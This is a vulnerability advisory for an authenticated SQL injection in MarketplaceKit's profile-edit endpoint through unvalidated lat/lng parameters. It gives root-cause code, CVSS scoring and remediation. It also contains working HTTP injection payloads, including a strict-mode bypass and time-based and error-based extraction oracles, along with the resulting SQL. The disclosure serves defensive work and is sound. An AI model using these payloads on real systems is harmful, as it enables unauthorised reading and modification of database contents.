# MarketplaceKit SQL Injection (Laravel 5.6)

**CWE-89 · Authenticated (any verified, non-admin user) SQL injection · arbitrary SQL as the database user (time-based and error-based oracles confirmed)**

> **Vendor:** marketplacekit (https://github.com/marketplacekit)
> **Product:** MarketplaceKit (Laravel 5.6)
> **Affected version:** master @ 534aa0eb9981a42115bb139f79ae5433b4483a05 (last commit 2019-10-22); no official release version
> **Affected endpoints:** `POST /account/edit_profile` (parameters `lat`, `lng`)
> **Disclosed via:** VulDB (submission #xxxxxx)
> **Note:** Example payloads extract only server metadata (`VERSION()`) in a local, isolated environment; no real user data was targeted.

## 1. Summary

`ProfileController@store` interpolates the user-controlled `lat`/`lng` parameters raw into `DB::raw("(GeomFromText('POINT($lat $lng)'))")`. The `UpdateUserProfile` form request validates only `username`, and the assignment bypasses Eloquent mass-assignment protection because it is a direct property write. Any registered, email-verified (non-admin) account can therefore execute arbitrary SQL — confirmed with time-based and error-based oracles against a default install.

## 2. Root Cause

| File | Lines | Role |
|---|---|---|
| `app/Http/Controllers/Account/ProfileController.php` | 47-55 | `lat`/`lng` read from request (48-49) and interpolated into `DB::raw` (50) |
| `app/Http/Requests/UpdateUserProfile.php` | 29-33 | `rules()` contains only the `username` rule — no validation for `lat`/`lng` |
| `routes/web.php` | 69 | `account` prefix group, middleware `auth` + `isVerified`; `Route::resource('edit_profile','ProfileController')` |

```php
// app/Http/Controllers/Account/ProfileController.php:47-55
if($request->input('lat') && $request->input('lng')) {
    $lat = $request->input('lat');
    $lng = $request->input('lng');
    $user->location = \DB::raw("(GeomFromText('POINT($lat $lng)'))");  // raw interpolation
    $user->address = $request->input('location');
    ...
    $user->save();   // -> UPDATE users SET location = (GeomFromText('POINT(<raw> <raw>)')), ...
}
```

The sink is a direct property assignment (not `fill()`), so `$fillable` does not protect it, and the injection point sits inside the single-quoted `POINT(...)` string literal.

## 3. Prerequisites

- Any registered, email-verified account (`auth` + `isVerified` middleware). No administrator privilege required.
- A MySQL server with `GeomFromText` semantics (MySQL 5.6/5.7, the 2018-era target of this application). On MySQL 8 the function was removed: the statement aborts with error 1305 before any expression evaluates — verified against MySQL 8.0.39, where a stored-function shim restored 5.6/5.7 semantics:

  ```sql
  CREATE FUNCTION GeomFromText(t TEXT) RETURNS geometry DETERMINISTIC
  RETURN ST_GeomFromText(t);
  ```

## 4. Reproduction

The straightforward payload does **not** work and dies with MySQL error 1292 (strict-mode string coercion of `'POINT(1...'` before the injected function evaluates). The working bypass has four requirements: close the string/parentheses early, add a multi-assignment into another column, park the template's trailing quote in a lazy `IF()` ELSE branch that never evaluates, and keep the trailing PDO placeholders intact (Laravel uses native prepares, `ATTR_EMULATE_PREPARES=false`).

```http
POST /account/edit_profile HTTP/1.1
Host: target
Cookie: <authenticated verified-user session>
Content-Type: application/x-www-form-urlencoded

username=test&lat=1 5)')) , username = IF((SELECT NOT SLEEP(5)),1,('&lng=x
```

Resulting statement (captured from the application log):

```sql
UPDATE users SET location=(GeomFromText('POINT(1 5)')),
       username=IF((SELECT NOT SLEEP(5)),1,(' x)')), updated_at=? WHERE id=4
```

Boolean data-conditioning for extraction, using only server metadata:

```http
... lat=1 5)')) , username = IF((SELECT ASCII(SUBSTRING(VERSION(),1,1))=56),(SELECT EXP(~0)),1), bio = IF(0,0,('&lng=x
```

## 5. Confirmed Techniques

Verified on a default local install (Laravel 5.6, PHP 7.4.33, MySQL 8.0.39 with the `GeomFromText` shim, registered + verified non-admin account):

| Test | Result |
|---|---|
| Baseline benign update (`lat=1&lng=5`) | ~2.5-2.8 s, `location = POINT(1 5)` stored |
| Time-based bypass payload (above) | 7.5-7.6 s vs ~2.6 s baseline; injected `IF()` branch value `1` persisted into `users.username` (DB-verified) |
| `IF(ASCII(SUBSTRING(VERSION(),1,1))=56, SLEEP(5), 0)` → delayed | version major is `'8'` (TRUE branch) |
| Same comparison `=57` | no delay (FALSE branch) — attacker-controlled boolean on DB data |
| Error-based `IF(cond,(SELECT EXP(~0)),1)` with TRUE condition | MySQL 1690 `DOUBLE value is out of range in 'exp(~(0))'` — exactly one 1690 entry in `storage/logs/laravel.log` |
| Same with FALSE condition | statement succeeded, no 1690 logged |
| Naive AND-chain (`1' AND (SELECT SLEEP(5)) AND '`) | fails: error 1292 before `SLEEP` evaluates — hence the bypass above |

POST-save 500 responses in the log stem from an unrelated Redis-queue listener failure after the DB write and do not affect the injection.

## 6. Impact

An authenticated verified user without administrator privileges executes arbitrary SQL as the database user: reading any table's data (time-based / error-based extraction demonstrated against server metadata), modifying any table's data (an injected assignment overwrote `users.username`), and depending on database privileges, writing files or escalating within the application. CVSS impact is scored C:H/I:H/A:H for full database compromise capability.

## 7. CVSS 3.1

`AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:H` (Base 8.8 - High)

## 8. Remediation

- Validate both parameters as numbers: add `'lat' => 'numeric', 'lng' => 'numeric'` to `UpdateUserProfile::rules()`, or cast `(float)` both inputs before use.
- Prefer building the geometry through a parameterized spatial expression (e.g. the `Grimzy\LaravelMysqlSpatial` `Point` type used elsewhere in the codebase) instead of string interpolation into `DB::raw`.

## 9. References

- Project: https://github.com/marketplacekit/marketplacekit
- CWE-89: https://cwe.mitre.org/data/definitions/89.html
- External disclosure: [GIST_URL]
- VulDB submission #xxxxxx

---
*All validation was performed in a local, isolated environment. The temporary environment was destroyed after testing.*
